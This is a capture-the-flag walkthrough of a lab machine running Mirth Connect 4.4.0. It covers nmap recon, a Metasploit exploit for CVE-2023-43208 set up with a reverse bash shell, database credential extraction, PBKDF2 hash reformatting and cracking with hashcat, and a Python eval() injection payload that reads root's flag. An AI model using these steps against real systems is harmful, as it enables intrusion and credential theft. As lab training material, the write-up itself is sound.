# Room: Interpreter

Difficulty: Medium

I started running nmap to scan for open ports using:
``` bash
nmap -sC -sV TARGET_IP -p- -T4
```
- -sC = default scripts
- -sV = version detection
- -p- = scan all ports
- -T4 = fast/aggressive scan

## Nmap Result
``` bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp   open  http     Jetty
443/tcp  open  ssl/http Jetty
6661/tcp open  unknown
```
## Web Enumeration

Upon visiting the website, I discovered it was Mirth Connect.

The version was 4.4.0, which is vulnerable to:
```
CVE-2023-43208
```
CVE-2023-43208 is a critical security flaw in Mirth Connect that allows an unauthenticated attacker to take full control of a server by sending a specially crafted, malicious message that the system improperly processes.

for more information:
- https://www.vicarius.io/vsociety/posts/rce-in-mirth-connect-pt-ii-cve-2023-43208
- https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5

## Exploitation (Metasploit)

I used the Metasploit module:
``` bash
exploit/multi/http/mirth_connect_cve_2023_43208
```
``` bash
set RHOSTS TARGET_IP
set RPORT 443
set LPORT 4444
set LHOST YOUR_IP
set SSL true
set PAYLOAD cmd/unix/reverse_bash
run
```
After running it, I successfully gained a shell as the mirth service user.

## Database Enumeration

While enumerating the system, I found a user named sedric.

Using google, i discovered Mirth Connect database configuration in:
``` bash
/usr/local/mirthconnect/conf/mirth.properties
```

## DB Credentials found:
```
database.username = mirthdb
database.password = MirthPass123!
```
## Database Access

I connected to MariaDB and enumerated databases:
``` bash
mc_bdd_prod
```
Important tables:
``` bash
PERSON
PERSON_PASSWORD
```
## Extracted Hash
Sedric's hash:
```
u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

## Password Cracking

Based on my research, Mirth Connect 4.4.0 uses:
```
PBKDF2WithHmacSHA256
```

Reference used: 
https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256

Step 1: Convert base64 → hex:
``` bash
echo -n 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p
```
Result:
``` bash
bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
```
Step 2: Extract Salt (IMPORTANT - 16 BYTES)

PBKDF2 format requires separating:

Salt (first 16 bytes = 32 hex characters)
Derived key / hash (remaining bytes)

Extract salt: 
``` bash
echo -n 'bbff8b0413949da762c8506c30ea080c' | xxd -r -p | base64
```
Result: 
``` bash
u/+LBBOUnac=
```
This is the PBKDF2 salt (16 bytes)

Extract hash (remaining bytes):
``` bash
echo -n 'f2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb' | xxd -r -p | base64
```
Result: 
``` bash
YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```
Step 3: Format for Hashcat

Construct hash in PBKDF2 format:
``` bash
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Where:

- sha256 = algorithm
- 600000 = iteration count (from Mirth implementation)
- u/+LBBOUnac= = salt (16 bytes)
- ... = derived key

Step 4: Crack with Hashcat
``` bash
hashcat -m 10900 hash.txt wordlist.txt
```
Mode used:
``` bash
10900 = PBKDF2-HMAC-SHA256
```
Result:
``` bash
<REDACTED>
```

## SSH Access

I logged in as sedric via SSH and found:
``` bash
/home/sedric/user.txt
```

## Privilege Escalation Enumeration

I ran linPEAS and found:
``` bash
/usr/local/bin/notif.py
```

## Vulnerable Script Analysis
notif.py key issue:
``` python
return eval(f"f'''{template}'''")
```
Vulnerability Type:

Python code injection via unsafe eval() with f-string

Why it is vulnerable:
- XML input is user-controlled
- Values are inserted into an f-string
- Then executed using eval()
- Regex only validates characters, not malicious structure
- Allows Python expression injection

# Local Port Forwarding

Since the target machine don't have curl and the service run at 127.0.0.1:54321, I used SSH tunneling:
``` bash
ssh -L 54321:127.0.0.1:54321 sedric@TARGET_IP
```
Now accessible locally.

## Exploitation

Payload:
``` xml
<patient>
  <firstname>{open('/root/root.txt').read()}</firstname>
  <lastname>x</lastname>
  <sender_app>x</sender_app>
  <timestamp>x</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>
```
Send request:
``` bash
curl -X POST http://127.0.0.1:54321/addPatient \
  -H "Content-Type: application/xml" \
  --data-binary @payload.xml
```

## Root flag
``` bash
Patient <ROOT_FLAG>
```

## Attack chain:
The attack began with an Nmap scan that identified several open services, including SSH and a Jetty web server hosting Mirth Connect Administrator. The version was confirmed as Mirth Connect 4.4.0, which is vulnerable to CVE-2023-43208, a deserialization-based remote code execution flaw. Using the Metasploit module for this CVE, I successfully gained initial access to the system as the “mirth” user. Further enumeration revealed a MariaDB database, with credentials stored in the Mirth configuration file (/usr/local/mirthconnect/conf/mirth.properties), allowing access to the mc_bdd_prod database where user and password data were stored. A PBKDF2-HMAC-SHA256 password hash was extracted from the PERSON_PASSWORD table and manually processed by decoding from Base64, converting to hex, and splitting into salt (first 16 bytes) and hash before formatting it for Hashcat mode 10900, which successfully recovered the password. After SSH login as user “sedric,” privilege escalation opportunities were investigated using linPEAS, leading to the discovery of /usr/local/bin/notif.py. This service contained a critical vulnerability where user-controlled XML input was injected into a Python f-string and executed using eval(), enabling Python code injection. By forwarding the local service via SSH tunneling, the endpoint was accessed externally, and crafted XML input allowed execution of arbitrary expressions, ultimately enabling retrieval of sensitive root-level data such as /root/root.txt.

``` bash
[ Nmap Recon ]
      |
      v
Open Ports Discovered
(22 SSH / 80-443 Mirth Connect / 6661)
      |
      v
[ Mirth Connect 4.4.0 Identified ]
      |
      v
CVE-2023-43208 (Deserialization RCE)
      |
      v
[ Metasploit Exploit ]
      |
      v
Initial Access (user: mirth)
      |
      v
Internal Enumeration
      |
      v
[ Found DB Credentials ]
(/usr/local/mirthconnect/conf/mirth.properties)
      |
      v
MariaDB Access (mc_bdd_prod)
      |
      v
Extracted User Hash (PBKDF2-HMAC-SHA256)
      |
      v
Hash Processing:
Base64 Decode → Hex Convert → Split (Salt / Hash)
      |
      v
Formatted for Hashcat (mode 10900)
      |
      v
Password Cracked
      |
      v
SSH Login (user: sedric)
      |
      v
Privilege Enumeration (linPEAS)
      |
      v
Found Vulnerable Service:
 /usr/local/bin/notif.py
      |
      v
Vulnerability:
eval(f"f'''{template}'''") → Python Code Injection
      |
      v
SSH Port Forwarding (localhost service exposed)
      |
      v
XML Payload Injection
      |
      v
Code Execution via eval()
      |
      v
Read Sensitive File:
 /root/root.txt
      |
      v
[ ROOT COMPROMISE / FLAG ACCESS ]
```
